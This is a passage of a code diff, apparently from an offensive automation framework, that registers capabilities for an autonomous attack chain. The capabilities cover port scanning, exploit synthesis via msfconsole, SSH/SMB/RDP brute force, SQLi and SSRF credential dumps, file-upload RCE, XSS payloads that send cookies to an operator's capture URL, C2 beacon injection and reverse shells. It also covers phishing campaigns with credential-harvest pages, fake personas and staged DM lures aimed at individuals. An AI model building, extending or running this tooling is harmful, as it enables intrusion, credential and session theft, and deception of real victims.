+               "consecutive chunks instead of scanning 65k ports for hours.",
+               [], ["service", "recon_verdict"], _ladder_engine,
+               _ladder_interp, exec_class="in_process_engine",
+               engine=_ladder_engine, opsec_cost=2.5, detection_risk=0.4,
+               stealth_level="active", timeout=600,
+               preconditions=[_has_network_host()], banner="recon ladder",
+               tools=["nmap"])
+
+
+def _mask_addr(addr: str) -> str:
+    """One-letter local part, stars for the rest (never the full address)."""
+    local, _, domain = str(addr or "").partition("@")
+    if not local or not domain:
+        return str(addr or "")
+    return local[:1] + "*" * max(3, len(local) - 1) + "@" + domain
+
+
+def _ladder_engine(wm, slots):
+    """Bounded multi-rung recon: preflight, chunked TCP, UDP, verdict.
+
+    Runs at EXECUTION time only (in-process engine): the chain preview must
+    never fire a scan. The verdict is committed as a finding so the planner
+    can see that network escalation is exhausted and pivot to identity.
+    """
+    from phantom.automation.recon_ladder import run_ladder
+    target = _effective_target(wm)
+    if not target:
+        return "RECON_VERDICT: surface=unreachable pivot=identity " \
+               "reason=no_target"
+    result = run_ladder(target)
+    return "\n".join(result.markers())
+
+
+def _ladder_interp(output: str, wm, slots):
+    """Turn ladder markers into service/recon_verdict findings."""
+    findings: List[Finding] = []
+    for line in (output or "").splitlines():
+        if line.startswith("SERVICE: "):
+            kv = {k: v for k, v in (part.split("=", 1)
+                                    for part in line[9:].split() if "=" in part)}
+            port = str(kv.get("port", "")).strip()
+            if not port.isdigit():
+                continue
+            findings.append(Finding(
+                kind="service", key=f"tcp/{port}",
+                value={"port": port,
+                       "service": kv.get("service", "") or "unknown",
+                       "state": "open", "source": "recon_ladder"},
+                confidence=0.8, source="recon_ladder",
+                evidence=line, target=wm.target))
+        elif line.startswith("RECON_VERDICT: "):
+            kv = {k: v for k, v in (part.split("=", 1)
+                                    for part in line[15:].split() if "=" in part)}
+            findings.append(Finding(
+                kind="recon_verdict", key="recon",
+                value={"surface": kv.get("surface", "unknown"),
+                       "pivot": kv.get("pivot", "identity"),
+                       "open": kv.get("open", "-"),
+                       "reason": kv.get("reason", "")},
+                confidence=0.9, source="recon_ladder",
+                evidence=line, target=wm.target))
+    return findings
+
+
+CAPABILITIES = [
+    _mk("fingerprint_services", "recon",
+        "Deep protocol fingerprint: socket-level probes for 15+ protocols "
+        "(SMB, MySQL, Redis, MongoDB, SSH, FTP, SMTP, SNMP, LDAP, RDP, "
+        "PostgreSQL, MSSQL, Docker, Kubernetes, DNS) extracting structured "
+        "data beyond nmap -sV — no external tools required",
+        [],
+        ["fingerprint"], _fingerprint_adapter, _fingerprint_interp,
+        # IN-PROCESS engine: it opens sockets to 15+ protocols, so it must
+        # run at EXECUTION time through `run_engine` — never while a command
+        # is being built (the chain preview does that for every candidate).
+        # Misclassified as shell_command before: the FINGERPRINT: markers
+        # were then queued as a shell task, which could never work.
+        exec_class="in_process_engine", engine=_fingerprint_adapter,
+        opsec_cost=1.5, detection_risk=0.2, stealth_level="stealth", timeout=60,
+        preconditions=[_has_network_host(), _has_finding("service")],
+        banner="deep fingerprint", tools=[]),
+
+    _mk("scan_tcp", "recon", "TCP port scan of the target",
+        [_mk_slot("port", "port", False, "comma-separated ports (default: top 100)")],
+        ["service"], _port_scan_adapter, _interp_nmap_ports,
+        opsec_cost=2.0, detection_risk=0.35, stealth_level="active", timeout=240,
+        preconditions=[_has_network_host()], banner="port scan",
+        tools=["nmap", "masscan", "nc"]),
+
+
+
+    # Origin discovery: the gate that keeps the chain off a provider's CDN.
+    # IP/domain targets increasingly resolve to a reverse proxy, and
+    # scanning that address footprints Cloudflare instead of the customer
+    # (and touches a third party's infrastructure). This capability answers
+    # "where is the machine BEHIND the edge" from public evidence only —
+    # CT-log hostnames, DNS resolution outside the provider ranges, response
+    # headers — and produces the EDGE gate fact plus the ORIGIN facts every
+    # network adapter then aims at through `_effective_target`.
+    _mk("origin_discovery", "recon",
+        "Origin discovery behind a CDN/edge: reads the HTTP header evidence "
+        "(cf-ray, x-amz-cf-id, x-iinfo, x-served-by …), mines CT-log "
+        "hostnames and DNS resolution for a host that is NOT in the "
+        "provider's ranges, and ranks the candidates. Public data only: it "
+        "never sends a scan packet at the edge",
+        [], ["edge", "origin"], _origin_adapter, _origin_interp,
+        exec_class="in_process_engine",   # P2-1: in-process engine
+        opsec_cost=0.2, detection_risk=0.05, stealth_level="passive",
+        timeout=120, preconditions=[_has_network_host()],
+        banner="origin discovery", tools=[]),
+
+    # Passive external intel: the wider internet's view of the target
+    # (Shodan InternetDB/keyed, crt.sh CT logs, BGP). It sends NOTHING at
+    # the target, so it is usable on every goal and profile — including a
+    # stealth run that will not tolerate a loud scan. It is the LAST source
+    # for `service` (a real scan wins when a scanner is installed and works)
+    # and the only source for `hostname`, which feeds origin discovery.
+    _mk("external_recon", "recon",
+        "Passive external intel: Shodan host view (open ports + hostnames) "
+        "for an IP, crt.sh CT-log subdomains for a domain, BGP netblock. "
+        "Sends no packet at the target — public data only.",
+        [], ["service", "hostname"], _external_intel_adapter,
+        external_intel_interp,
+        exec_class="in_process_engine", engine=external_intel_engine,
+        opsec_cost=0.1, detection_risk=0.0, stealth_level="passive",
+        timeout=45, preconditions=[_has_network_host(),
+                                   _external_intel_applicable],
+        banner="external intel", tools=[]),
+
+    # Passive phone / geolocation intel: OFFLINE metadata (the phonenumbers
+    # database) over a number we already hold — the engagement target or a
+    # number a breach/identity finding surfaced. It sends NOTHING anywhere
+    # (not even a public API), so it is usable on every profile, and it is
+    # the ONE source for `phone` and `geolocation`, the facts the report
+    # writer and the engagement planner need to shape phone pretexts and
+    # calling windows.
+    _mk("phone_osint", "osint",
+        "Passive phone-number intel: canonical E.164, validity, line type "
+        "(mobile/fixed/VoIP), carrier, region and timezone from the offline "
+        "phonenumbers metadata database. Sends nothing — no request at all.",
+        [_mk_slot("phone", "str", False, "phone number (default: target/finding)")],
+        ["phone", "geolocation"], _phone_intel_adapter, phone_intel_interp,
+        exec_class="in_process_engine", engine=phone_intel_engine,
+        opsec_cost=0.1, detection_risk=0.0, stealth_level="passive",
+        timeout=20, preconditions=[_has_phone_number()],
+        banner="phone intel", tools=[]),
+
+    _mk("version_detect", "recon", "Service version fingerprinting",
+        [_mk_slot("port", "port", False, "target port")],
+        ["service", "version"], _version_adapter, _interp_nmap_ports,
+        opsec_cost=2.5, detection_risk=0.3, stealth_level="active", timeout=240,
+        # kill-chain discipline lives in the ADAPTER, not the precondition:
+        # version_detect must stay plan-reachable (it is a source for the
+        # "service" fact, and a precondition requiring an existing service
+        # finding would make it unplannable — the fact it produces is only
+        # needed when it does NOT exist yet). The adapter below only deepens
+        # ports the scan already found open, and degrades to a no-op when
+        # nothing is known, so a blind -sV re-scan never happens.
+        preconditions=[_has_network_host()],
+        banner="version detect", tools=["nmap"]),
+
+    _mk("curl_probe", "recon", "curl-only port/banner sweep: TCP openness "
+        "via telnet:// plus banner grab on the shortlist (21/22/25/80/ "
+        "110/143/443/587/8080/8443). The footprint engine for boxes "
+        "without nmap — every curl ships this, every OS runs it.",
+        [_mk_slot("ports", "port", False, "space/comma ports (default: shortlist)")],
+        ["service", "banner", "os"], _curl_probe_adapter, _curl_probe_interp,
+        opsec_cost=2.0, detection_risk=0.3, stealth_level="active", timeout=120,
+        # fallback position is deliberate: the registry order tries nmap
+        # first (richer: OS, scripts, versions); curl_probe fires when no
+        # scanner exists, so a curl-only box still grows service facts.
+        preconditions=[_has_network_host()],
+        banner="curl port/banner probe", tools=["curl"]),
+
+    _mk("service_exploit", "exploit",
+        "Version-matched exploit: match the fingerprinted software@version "
+        "to the CVE module registry and synthesize the msfconsole command "
+        "(resource script + payload resolved for the target platform)",
+        [_mk_slot("payload", "str", False, "payload platform hint (auto)")],
+        ["exploit_plan"], _service_exploit_adapter, _service_exploit_interp,
+        opsec_cost=4.0, detection_risk=0.7, stealth_level="active",
+        forceful=True, timeout=120,
+        preconditions=[_has_network_host(), _has_finding("service")],
+        banner="version-matched exploit", tools=["msfconsole"]),
+
+    # P3: the generative fuzz engine (brain/fuzz) already existed but NO
+    # capability ever invoked it, so its differential-oracle findings never
+    # reached the chain. Registered as an in-process hunting move beside
+    # `hunt_web`: same declared effect (hunt_anomaly), a different technique
+    # (generative mutation of the parameters the target actually has).
+    _mk("fuzz_params", "hunt",
+        "Generative parameter fuzzing: baseline every parameter the target "
+        "actually exposes, seed grammar-driven mutations, keep what the "
+        "differential oracle flags, evolve it, and reproduce before calling "
+        "anything confirmed — bounded rounds/requests, no LLM",
+        [_mk_slot("params", "str", False, "parameters (default: discovered)"),
+         _mk_slot("port", "port", False, "web port (default: discovered)")],
+        ["hunt_anomaly"], _fuzz_adapter, _fuzz_interp, engine=_fuzz_engine,
+        exec_class="in_process_engine",
+        opsec_cost=1.0, detection_risk=0.25, stealth_level="active",
+        forceful=True, timeout=120,
+        preconditions=[_has_web_service()],
+        banner="generative parameter fuzzing", tools=["curl"]),
+
+    _mk("hunt_web", "hunt",
+        "Behavioural bug-class hunting: endpoint discovery (robots.txt, "
+        "sitemap.xml, homepage crawl, common paths), baseline + statistical "
+        "anomaly scoring (status/size/timing/body markers), validation "
+        "pass (confirmed/severity), mutation escalation on the winning "
+        "payload, session cookies when stolen — candidates, not verdicts, "
+        "no LLM, deterministic and bounded",
+        [_mk_slot("port", "port", False, "web port (default: all web services)")],
+        ["hunt_anomaly"], _hunt_web_adapter, _hunt_web_interp,
+        exec_class="in_process_engine",   # P2-1: anomaly engine, in-process
+        opsec_cost=1.0, detection_risk=0.25, stealth_level="active",
+        forceful=True, timeout=120,
+        preconditions=[_has_network_host(), _has_finding("service")],
+        banner="behavioural hunt", tools=[]),
+
+    _mk("idor_scan", "exploit",
+        "IDOR engine: differential reference walk on web endpoints (id/uid/"
+        "order/invoice/document params) — baseline id=1, walk neighbors + "
+        "foreign refs, flag distinct-object leaks (identity markers, size "
+        "delta, status delta). Authorization flaw detection: a different "
+        "object served to a caller that should not own it. Bounded GETs, "
+        "deterministic, no external tools. LLM gate withholds the leaked "
+        "body when the advisor is enabled",
+        [_mk_slot("port", "port", False, "web port (default: all web services)")],
+        ["idor"], _idor_adapter, _idor_interp,
+        exec_class="in_process_engine",   # P2-1: IDOR engine, in-process
+        opsec_cost=1.2, detection_risk=0.3, stealth_level="active",
+        timeout=120, preconditions=[_has_network_host(), _has_finding("service")],
+        banner="IDOR reference walk", tools=[]),
+
+    _mk("differential_analysis", "hunt",
+        "Protocol-agnostic differential analysis: baseline each service, "
+        "send mutated probes (SQLi/SSTI/traversal/SSRF/XXE for HTTP, "
+        "protocol-specific mutations for SMB/MySQL/Redis/SSH/FTP/LDAP), "
+        "score against baseline (status/size/timing/body markers), "
+        "validate top anomalies, report confirmed findings",
+        [], ["differential_anomaly"], _differential_adapter, _differential_interp,
+        exec_class="in_process_engine",   # P2-1: differential engine, in-process
+        opsec_cost=1.5, detection_risk=0.3, stealth_level="active",
+        forceful=True, timeout=120,
+        preconditions=[_has_network_host(), _has_finding("service")],
+        banner="differential analysis", tools=[]),
+
+    _mk("xss_weaponize", "exploit",
+        "Turn a CONFIRMED reflected XSS into the session-theft asset: build "
+        "the exfiltration payload that ships document.cookie (or, in creds "
+        "mode, the lure form's fields) to the operator's capture URL, plus "
+        "the ready-to-send PoC URL at the confirmed injection point. "
+        "Delivery still needs a victim: this produces the weapon, not a "
+        "compromise.",
+        [_mk_slot("exfil_url", "str", True,
+                  "operator capture endpoint (a domain, not a bare IP)"),
+         _mk_slot("steal", "str", False, "cookie|creds")],
+        ["xss_exfil"], _xss_weaponize_adapter, _xss_weaponize_interp,
+        exec_class="in_process_engine",
+        opsec_cost=0.4, detection_risk=0.1, stealth_level="active", timeout=20,
+        preconditions=[_has_web_service(), _has_confirmed_xss()],
+        banner="weaponize XSS", tools=[]),
+
+    _mk("rce_foothold", "exploit",
+        "Turn a CONFIRMED code-execution candidate into a verified foothold "
+        "(no credentials): SSTI -> command execution marker, SSRF -> cloud "
+        "metadata IAM creds, RCE-class exploit plan -> msf session watch",
+        # effects must be COMPLETE: the SSRF channel also emits
+        # `cloud_creds` (metadata IAM), and the planner's reverse index
+        # already lists rce_foothold as a source for it.
+        [], ["rce_foothold", "cloud_creds"], _rce_foothold_adapter, _rce_foothold_interp,
+        opsec_cost=2.0, detection_risk=0.5, stealth_level="active",
+        forceful=True, timeout=90,
+        preconditions=[_has_network_host(), _has_confirmed_rce()],
+        banner="verify RCE foothold", tools=["curl"]),
+
+    _mk("beacon_via_rce", "exploit",
+        "Inject our C++ beacon THROUGH the confirmed RCE channel — the "
+        "senior move that reaches C2 access from a code-execution primitive "
+        "without ever needing credentials",
+        [_mk_slot("command", "command", True, "beacon dropper command line")],
+        ["beacon"], _beacon_via_rce_adapter, None,
+        opsec_cost=5.0, detection_risk=0.85, stealth_level="aggressive", timeout=60,
+        preconditions=[_has_network_host(), _has_finding("rce_foothold")],
+        banner="beacon via RCE", tools=["curl"]),
+
+    _mk("env_probe", "recon",
+        "Recognize the environment from the outside: exposed Docker/K8s "
+        "management APIs and SCADA/ICS port classes — the senior operator "
+        "knows the battlefield before choosing weapons",
+        [], ["environment"], _env_probe_adapter, _env_probe_interp,
+        opsec_cost=0.6, detection_risk=0.1, stealth_level="passive", timeout=45,
+        preconditions=[_has_network_host()],
+        banner="environment probe", tools=["curl"]),
+
+    _mk("env_probe_internal", "post",
+        "Recognize the environment FROM INSIDE the beacon: container "
+        "markers (/proc/1/cgroup, /.dockerenv) and AWS metadata via the "
+        "IMDS v2 token flow — the vantage the outside probe cannot reach "
+        "(link-local metadata is only valid from the box itself)",
+        [], ["environment"], _env_internal_adapter, _env_probe_interp,
+        opsec_cost=0.4, detection_risk=0.05, stealth_level="passive", timeout=30,
+        preconditions=[_has_beacon()],
+        banner="internal environment probe"),
+
+    _mk("os_detect", "recon", "Remote OS fingerprinting",
+        [], ["os"], _os_adapter, _interp_nmap_os,
+        opsec_cost=3.0, detection_risk=0.4, stealth_level="aggressive", timeout=120,
+        preconditions=[_has_network_host()], banner="os detect", tools=["nmap"]),
+    _mk("http_probe", "recon", "HTTP banner/title/CMS fingerprint",
+        [_mk_slot("url", "url", False, "full URL (default: http://target)")],
+        ["web_header", "web_title", "web_app", "service"], _http_probe_adapter,
+        _interp_http,
+        opsec_cost=0.5, detection_risk=0.1, stealth_level="passive", timeout=30,
+        preconditions=[_has_network_host()], banner="http probe", tools=["curl", "httpx"]),
+
+    _mk("http_get", "recon", "Fetch HTTP page content",
+        [_mk_slot("url", "url", True, "full URL")],
+        ["web_content", "web_path"], _http_get_adapter, _http_get_interp,
+        opsec_cost=0.5, detection_risk=0.1, stealth_level="passive", timeout=30,
+        preconditions=[_has_network_host()], banner="http get",
+        tools=["curl", "wget"]),
+
+    _mk("smb_enum", "service", "Enumerate SMB shares and permissions",
+        [_mk_slot("host", "host", False, "SMB host (default: target)")],
+        ["smb_share"], _smb_enum_adapter, _interp_smb,
+        opsec_cost=1.5, detection_risk=0.25, stealth_level="active", timeout=60,
+        preconditions=[_has_network_host()], banner="smb enum", tools=["smbmap"]),
+
+    _mk("redis_info", "service", "Pull Redis INFO (version, role, auth state)",
+        [_mk_slot("port", "port", False, "Redis port (default 6379)")],
+        ["redis"], _redis_info_adapter, _interp_redis,
+        opsec_cost=0.8, detection_risk=0.15, stealth_level="active", timeout=30,
+        preconditions=[_has_network_host()], banner="redis info",
+        tools=["redis-cli", "nc"]),
+
+    _mk("ssh_banner", "service", "Grab SSH banner for version analysis",
+        [_mk_slot("port", "port", False, "SSH port (default 22)")],
+        ["banner"], _ssh_banner_adapter, _interp_ssh_banner,
+        opsec_cost=0.3, detection_risk=0.05, stealth_level="passive", timeout=15,
+        # kill-chain discipline: only grab the SSH banner when the footprint
+        # scan actually identified an SSH service — firing nc at port 22 on
+        # every host (even with no SSH open) is the wasted-move loop the
+        # operator saw as "ssh banner" failing again and again.
+        preconditions=[_has_network_host(), _has_service_kind("service", "ssh")],
+        banner="ssh banner", tools=["nc"]),
+
+    _mk("brute_ssh", "brute",
+        "Online SSH brute force with the toolbelt's cracker (hydra > "
+        "medusa): default-credential set + operator wordlists, "
+        "stop-on-first-hit. Hard-gated behind --aggressive (noisy)",
+        [], ["creds"], _brute_ssh_adapter, _brute_ssh_interp,
+        opsec_cost=2.2, detection_risk=0.7, stealth_level="aggressive",
+        timeout=300, forceful=True,
+        preconditions=[_has_service_kind("service", "ssh"), _has_network_host()],
+        banner="ssh brute", tools=["hydra", "medusa"]),
+
+    _mk("brute_smb", "brute",
+        "Online SMB brute force with the toolbelt's cracker (hydra > medusa): "
+        "default-credential set + operator wordlists, stop-on-first-hit. The "
+        "creds source a Windows box whose ONLY surface is SMB (no web, no "
+        "ssh) needs. Hard-gated behind --aggressive (noisy)",
+        [], ["creds"], _brute_smb_adapter, _brute_smb_interp,
+        opsec_cost=2.2, detection_risk=0.7, stealth_level="aggressive",
+        timeout=300, forceful=True,
+        preconditions=[_has_any_service(("microsoft-ds", "netbios-ssn", "smb"),
+                                        "smb"),
+                       _has_network_host()],
+        banner="smb brute", tools=["hydra", "medusa"]),
+
+    _mk("brute_rdp", "brute",
+        "Online RDP brute force with the toolbelt's cracker (hydra > medusa): "
+        "default-credential set + operator wordlists, stop-on-first-hit. RDP "
+        "is a Windows surface with no other creds source. Hard-gated behind "
+        "--aggressive (noisy)",
+        [], ["creds"], _brute_rdp_adapter, _brute_rdp_interp,
+        opsec_cost=2.4, detection_risk=0.75, stealth_level="aggressive",
+        timeout=300, forceful=True,
+        preconditions=[_has_any_service(("ms-wbt-server", "rdp"), "rdp"),
+                       _has_network_host()],
+        banner="rdp brute", tools=["hydra", "medusa"]),
+
+    _mk("ssh_login", "creds", "Single credential pair check over SSH",
+        [_mk_slot("username", "username", True, "account"), _mk_slot("password", "password", True, "password")],
+        ["creds"], _ssh_login_adapter, None,
+        opsec_cost=1.2, detection_risk=0.45, stealth_level="aggressive", timeout=20,
+        preconditions=[_has_service_kind("service", "ssh"), _has_network_host()],
+        banner="ssh login", tools=["sshpass"]),
+
+    _mk("web_creds", "exploit",
+        "Web credential extraction: SSRF file-read primitives and SQLi "
+        "auth-bypass/UNION dumps on discovered web services — the senior "
+        "move when the app leaks the database instead of brute-forcing "
+        "SSH (deterministic, bounded, zero external tools)",
+        [], ["creds"], _web_creds_adapter, _web_creds_interp,
+        exec_class="in_process_engine",   # P2-1: SSRF/SQLi engine, in-process
+        opsec_cost=1.4, detection_risk=0.25, stealth_level="active",
+        timeout=120, preconditions=[_has_web_service()],
+        banner="web credential extraction", tools=["curl"]),
+
+    _mk("web_rce", "exploit",
+        "Arbitrary-file-upload -> RCE probe on the web app: upload a tiny "
+        "python script and check for the execution marker. Real code "
+        "execution without any credentials — skips the whole credential "
+        "hunting phase when the app has a report-generator RCE",
+        [], ["rce_foothold"], _web_rce_adapter, _web_rce_interp,
+        opsec_cost=1.6, detection_risk=0.35, stealth_level="active",
+        timeout=30, preconditions=[_has_web_service()],
+        banner="web upload RCE probe", tools=["curl"]),
+
+    _mk("osint_identity", "osint",
+        "OSINT discovery on an identity target (username/email/phone): "
+        "platforms, profiles, public links (sherlock / theHarvester)",
+        [], ["identity"], _osint_identity_adapter, _social_interp,
+        opsec_cost=0.8, detection_risk=0.1, stealth_level="passive", timeout=120,
+        preconditions=[_has_target_type("username", "email", "phone")],
+        banner="osint identity"),
+
+    _mk("breach_check", "osint",
+        "Breach-dump lookup for an email/username -> leaked credentials",
+        # effects must be COMPLETE: the interpreter also emits
+        # `breach_exposure` (the marker line), and the planner's reverse
+        # index lists it here. Leaving it out made a plan whose last step
+        # was breach_check report complete=False even after it succeeded.
+        [], ["creds", "breach_exposure"], _breach_check_adapter, _social_interp,
+        opsec_cost=0.6, detection_risk=0.05, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("email", "username")],
+        banner="breach check"),
+
+    _mk("email_candidates", "osint",
+        "Compose candidate addresses from the name/handle x OBSERVED "
+        "domains — the identity-aware, bounded 'crunch' step. Offline and "
+        "passive: never invents a domain, never contacts the target",
+        [], ["email_candidate", "domain_candidate"], _email_candidates_adapter,
+        _social_interp,
+        opsec_cost=0.1, detection_risk=0.0, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("username", "email", "phone")],
+        banner="compose email candidates"),
+
+    _mk("reset_enum", "osint",
+        "Ask a service's password-reset form to reveal the masked address "
+        "(the operator's reset leak). ACTIVE: needs the dedicated identity "
+        "consent, one bounded request, no retries",
+        [_mk_slot("service_url", "str", False, "reset endpoint URL"),
+         _mk_slot("email", "str", False, "address to probe")],
+        ["email_masked"], _reset_enum_adapter, _social_interp,
+        opsec_cost=0.8, detection_risk=0.3, stealth_level="active", timeout=20,
+        preconditions=[_has_target_type("username", "email", "phone")],
+        banner="enumerate masked address"),
+
+    _mk("email_verify", "osint",
+        "SMTP RCPT + MX verification of candidate addresses, with honest "
+        "catch-all detection. ACTIVE: needs the dedicated identity consent, "
+        "bounded, never sends DATA",
+        [_mk_slot("addresses", "str", False, "comma-separated candidates"),
+         _mk_slot("sender", "str", False, "MAIL FROM address")],
+        ["email_verified"], _email_verify_adapter, _social_interp,
+        opsec_cost=0.6, detection_risk=0.2, stealth_level="active", timeout=60,
+        preconditions=[_has_target_type("username", "email", "phone")],
+        banner="verify email existence"),
+
+    _mk("breach_correlate", "osint",
+        "Correlate breach exposure for a confirmed address: widen the "
+        "identity and surface reusable credentials (same-person link)",
+        [_mk_slot("email", "str", False, "address to correlate")],
+        ["breach_exposure", "identity_widened", "service_account"],
+        _breach_correlate_adapter, _social_interp,
+        opsec_cost=0.4, detection_risk=0.0, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("email", "username")],
+        banner="correlate breach exposure"),
+
+    _mk("persona_create", "social",
+        "Create a disposable persona with a temp mailbox for social engineering",
+        [], ["identity"], _persona_create_adapter, _social_interp,
+        opsec_cost=0.3, detection_risk=0.05, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("username", "email", "phone")],
+        banner="create persona"),
+
+    _mk("phish_identity", "social",
+        "Deliver a phish (email for email targets, sms for phones) with an "
+        "IP-grabbing link to convert the identity into a machine target",
+        [], ["phish"], _phish_adapter, _social_interp,
+        opsec_cost=1.8, detection_risk=0.5, stealth_level="active", timeout=60,
+        preconditions=[_has_target_type("username", "email", "phone"),
+                       _has_finding("identity"), _not_private_profile()],
+        banner="phish identity"),
+
+    _mk("poll_hits", "social",
+        "Poll the IP-grabber for victim clicks -> victim machine IP",
+        [], ["victim_ip"], _poll_hits_adapter, _social_interp,
+        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=120,
+        preconditions=[_has_target_type("username", "email", "phone"),
+                       _has_sent_lure(), _not_profile_known()],
+        banner="poll grabber hits"),
+
+    _mk("campaign_launch", "social",
+        "Launch a full phishing campaign: personalized pretext lures "
+        "(security alert, IT, HR, recruiter, delivery...) with open-tracking "
+        "pixels and credential-harvest login pages",
+        [_mk_slot("pretext", "str", False,
+                  "security_alert|it_helpdesk|hr_benefits|recruiter|"
+                  "package_delivery|password_reset|doc_share")],
+        ["phish"], _campaign_adapter, _social_interp,
+        opsec_cost=2.5, detection_risk=0.6, stealth_level="active", timeout=90,
+        preconditions=[_has_target_type("username", "email", "phone"),
+                       _has_finding("identity"), _not_private_profile()],
+        banner="launch campaign"),
+
+    _mk("harvest_campaign", "social",
+        "Poll campaigns for opens, clicks (victim IP) and harvested "
+        "credentials from fake login pages",
+        [], ["victim_ip", "creds"], _harvest_adapter, _social_interp,
+        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=120,
+        preconditions=[_has_target_type("username", "email", "phone"),
+                       _has_sent_lure(), _harvest_flow()],
+        banner="harvest campaign"),
+
+    _mk("dm_launch", "social",
+        "Deliver the social contact, strategy decided by the CHANNEL: an "
+        "ATTACHMENT (no URL at all, capture fires on open) where the "
+        "channel carries files, an innocuous two-stage opener (link HELD "
+        "for dm_stage2) where it does not",
+        [_mk_slot("pretext", "str", False,
+                  "wrong_recipient|found_file|is_this_you|mentioned_doc "
+                  "(innocuous, no link) or security_verify|recruiter|collab|"
+                  "prize|invoice (flagged: link in the message)")],
+        # effects must be COMPLETE: the interpreter also emits `dm_stage`
+        # and `dm_plan` (dm_stage2's precondition is exactly `dm_stage`),
+        # which the planner's reverse index already attributes here.
+        ["dm_sent", "phish", "dm_stage", "dm_plan"], _dm_adapter,
+        _social_interp,
+        opsec_cost=2.0, detection_risk=0.6, stealth_level="active", timeout=60,
+        preconditions=[_has_target_type("username", "email"),
+                       _dm_ready()],
+        banner="send DMs"),
+
+    _mk("dm_stage2", "social",
+        "Send the HELD LINK (stage 2) to the handles whose opener landed "
+        "and who replied — resumed across sessions, so a chain that "
+        "started yesterday still finishes today",
+        [_mk_slot("pretext", "str", False,
+                  "wrong_recipient|found_file|is_this_you|mentioned_doc")],
+        ["dm_sent", "phish"], _dm_stage2_adapter, _social_interp,
+        opsec_cost=1.5, detection_risk=0.5, stealth_level="active", timeout=60,
+        preconditions=[_has_target_type("username", "email"),
+                       _has_finding("dm_stage"), _dm_ready()],
+        banner="send held link (stage 2)"),
+
+    _mk("dm_follow", "social",
+        "Send a follow request to a PRIVATE account before the DM: the "
+        "target must accept before the DM can be delivered",
+        [], ["follow_sent"], _dm_adapter, _social_interp,
+        opsec_cost=1.0, detection_risk=0.2, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("username"), _has_real_profile()],
+        banner="follow private account"),
+
+    _mk("wait_follow", "social",
+        "Wait for the target to accept the follow request (sleep state: "
+        "the run pauses for the human, short under the fast flag)",
+        [], ["follow_accepted"], _harvest_adapter, _social_interp,
+        opsec_cost=0.1, detection_risk=0.0, stealth_level="passive", timeout=120,
+        preconditions=[_has_target_type("username"), _has_finding("follow_sent")],
+        banner="wait for follow accept"),
+
+    _mk("persona_profile", "social",
+        "Create a coherent social cover (name, age, job, city, interests, "
+        "bio, avatar) so the attacker identity is believable on platforms",
+        [], ["persona_profile"], _persona_profile_adapter, _social_interp,
+        opsec_cost=0.3, detection_risk=0.0, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("username", "email", "phone")],
+        banner="build persona profile"),
+
+    _mk("dossier_analyze", "social",
+        "Build the strategic target dossier: breach correlation across "
+        "email/phone + recommended pretext for a single high-quality lure",
+        [], ["dossier"], _dossier_adapter, _social_interp,
+        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=30,
+        preconditions=[_has_target_type("username", "email", "phone"),
+                       _has_finding("identity")],
+        banner="analyze target dossier"),
+
+    _mk("profile_recon", "social",
+        "Reverse-engineering of a target social profile: private/public "
+        "state, bio + link in bio, @handles, and same-handle accounts on "
+        "other platforms (sherlock) — pure OSINT, no scraping of private "
+        "content. Username targets use the handle directly; an EMAIL target "
+        "is mapped through its local-part handle (mario.rossi@x.com -> "
+        "mario.rossi) so the reverse pass runs for every identity type that "
+        "OSINT can pin a handle on",
+        [_mk_slot("platform", "str", False,
+                  "instagram|tiktok|x|github|telegram PINS the pass to that "
+                  "one network (a namesake elsewhere is a different "
+                  "person); `other` EXCLUDES those five and looks "
+                  "elsewhere")],
+        ["profile", "account_link"], _profile_recon_adapter, _social_interp,
+        opsec_cost=0.5, detection_risk=0.0, stealth_level="passive", timeout=60,
+        preconditions=[_has_target_type("username", "email")],
+        banner="profile reverse-engineering"),
+
+    _mk("deep_recon", "osint",
+        "DEEP profile reverse-engineering (the reliable pass): multi-marker "
+        "private-state voting across two fetches, tagged/commenter/follower "
+        "mining from embedded JSON, username-variant probing, Wayback "
+        "snapshots of ex-public profiles, search dorks (by handle AND by "
+        "the real name, when one was found), avatar-hash and bio-similarity "
+        "cross-account correlation — every lead carries its evidence "
+        "source. Pure OSINT, bounded (<=20 calls), never blocks",
+        [_mk_slot("platform", "str", False,
+                  "instagram|tiktok|x|github|telegram PINS the pass to that "
+                  "one network; `other` EXCLUDES those five and searches "
+                  "elsewhere")],
+        ["profile", "account_link", "identity"], _profile_recon_adapter,
+        _social_interp,
+        opsec_cost=0.8, detection_risk=0.0, stealth_level="passive", timeout=240,
+        preconditions=[_has_target_type("username", "email")],
+        banner="deep profile recon"),
+
+    _mk("surface_map", "osint",
+        "Hardened-target attack-surface mapping: Certificate Transparency "
+        "hosts, Wayback endpoints, JS-referenced API routes, mail topology "
+        "(SPF/DMARC spoofability), SSO/OIDC portals, VPN gateway "
+        "fingerprints, DNS misconfigs — each asset risk-scored so the "
+        "planner can rank real attack paths on CDN/WAF-fronted targets "
+        "where port scans legitimately find nothing",
+        [], ["environment"], _surface_map_adapter, _social_interp,
+        opsec_cost=0.6, detection_risk=0.05, stealth_level="passive",
+        timeout=300,
+        preconditions=[_has_network_host()], banner="attack surface map"),
+
+    _mk("beacon_deploy", "beacon", "Execute a beacon/payload command on target",
+        [_mk_slot("command", "command", True, "payload command line")],
+        ["beacon"], _beacon_adapter, _beacon_interp,
+        opsec_cost=5.0, detection_risk=0.8, stealth_level="aggressive", timeout=30,
+        preconditions=[_has_creds(), _has_network_host()], banner="beacon deploy"),
+
+    _mk("payload_reverse", "payload",
+        "Synthesize a reverse shell for the target platform (bash/nc/socat/"
+        "openssl/python/perl/php on Linux, powershell/powercat/certutil on "
+        "Windows). The target connects OUT to our listener — the stealth "
+        "posture. Used as the fallback foothold when the beacon cannot be "
+        "injected directly yet; the terminal goal stays beacon_deploy.",
+        [_mk_slot("lhost", "ip", True, "our listener address"),
+         _mk_slot("lport", "port", True, "our listener port"),
+         _mk_slot("dialect", "choice", False, "bash|nc|socat|python3|...")],
+        ["shell_foothold"], _payload_reverse_adapter, _payload_interp,
+        opsec_cost=2.5, detection_risk=0.6, stealth_level="active", timeout=20,
+        preconditions=[_has_network_host()], banner="reverse shell",
